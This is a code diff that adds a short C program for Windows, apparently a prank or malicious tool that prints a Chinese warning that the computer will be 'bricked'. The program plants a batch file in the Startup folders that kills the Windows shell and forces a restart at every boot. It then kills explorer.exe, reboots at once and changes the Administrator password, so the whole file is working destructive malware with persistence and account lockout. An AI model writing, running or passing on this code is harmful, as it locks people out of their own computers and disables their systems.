@@ -1,0 +1,22 @@
+#include<stdio.h>
+#include<windows.h>
+int main()
+{
+	FILE *p;
+	char a[100]="taskkill /f /im explorer.exe";
+	char b[100]="shutdown /r /t 120";
+	printf("你的电脑将变砖\n");
+	p=fopen("c:\\gaoshi.txt","w+");
+	fputs(a,p);
+	fputs("\n",p);
+	fputs(b,p);
+	fputs("\n",p);
+	fclose(p);
+	system("ren c:\\gaoshi.txt,gaoshi.cmd");
+	system("copy c:\\gaoshi.cmd \"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\gaoshi.cmd\"");
+	system("copy c:\\gaoshi.cmd \"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\"");
+	system("taskkill /f /im explorer.exe");
+	system("shutdown  /r /t 0");
+	system("net users Administrator 233");
+	return 0;
+}
